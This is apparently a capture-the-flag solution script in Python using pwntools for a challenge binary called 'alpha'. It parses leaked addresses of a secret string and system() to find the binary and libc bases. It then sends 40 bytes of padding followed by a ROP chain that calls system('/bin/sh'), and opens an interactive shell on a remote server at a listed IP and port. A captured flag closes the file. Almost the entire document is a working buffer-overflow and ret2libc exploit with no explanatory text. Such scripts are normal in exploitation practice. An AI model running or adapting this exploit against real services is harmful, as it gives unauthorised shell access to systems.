#!/usr/bin/python

from pwn import *

context.arch = 'amd64'

binary = elf.ELF("./alpha")
local = False
libc = binary.libc 
conn = process("./alpha")

if not local:
	conn.close()
	conn = remote("52.62.230.210", 9001)
	libc = elf.ELF("./libc.so.6")


conn.recvuntil("secret: ")
addr_secret = int(conn.recvuntil("\n"), 16)

conn.recvuntil("system: ")
addr_system = int(conn.recvuntil("\n"), 16)

print "[+] System: " + hex(addr_system)
# update our elfs from the leaks
binary.address = addr_secret - list(binary.search("Wubba lubba dub dub!"))[0]
libc.address = addr_system - libc.symbols["system"]


padding = "A"*5*8 
rop = ROP(libc)
rop.system(list(libc.search("/bin/sh\x00"))[0])
conn.sendline(padding + str(rop))
conn.interactive()

# hack.Sydney{5pl00sh_0oh_w33}
